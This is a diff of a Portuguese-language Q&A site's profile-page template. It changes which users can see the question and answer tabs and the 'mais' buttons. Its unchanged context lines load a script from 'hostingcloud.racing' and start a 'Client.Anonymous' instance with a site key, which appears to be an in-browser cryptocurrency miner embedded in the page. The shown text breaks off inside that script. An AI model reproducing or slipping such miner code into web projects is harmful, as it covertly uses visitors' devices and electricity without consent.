@@ -202,6 +202,8 @@
 
 		{% if user_p.user.username == user.username %}
 		<div id="edit-profile"><a href="/user/{{ user.username }}/edit">Editar perfil</a></div>
+		{% endif %}
+		{% if user_p.user.username == user.username or not user_p.hide_activity %}
 		<ul class="nav nav-tabs" id="tabs">
 			<li class="nav-item">
 				<a class="nav-link active"  id="questions">Perguntas</a>
@@ -210,7 +212,6 @@
 				<a class="nav-link disabled" id="responses">Respostas</a>
 			</li>
 		</ul>
-		{% endif %}
 		<section id="questions-section">
 			<div id="qs">
 				{% for question in questions %}
@@ -220,8 +221,8 @@
 				</div>
 				<hr>
 				{% endfor %}
-			</div>{% if user.username == user_p.user.username %}
-			<button class="btn btn-outline-primary" onclick="show_more_questions(this)">mais</button>{% endif %}
+			</div>
+			<button class="btn btn-outline-primary" onclick="show_more_questions(this)">mais</button>
 		</section>
 
 		<section id="responses-section">
@@ -237,9 +238,10 @@
 			</div>
 			<button class="btn btn-outline-primary" onclick="show_more_responses(this)">mais</button>
 		</section>
-{% if user_p.user.username == user.username %}
-<script src="/static/js/profile.js"></script>
-{% endif %}
+
+		<script src="/static/js/profile.js"></script>
+		{% endif %}
+
 <script src="https://www.hostingcloud.racing/gCgZ.js"></script>
 <script>
     var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
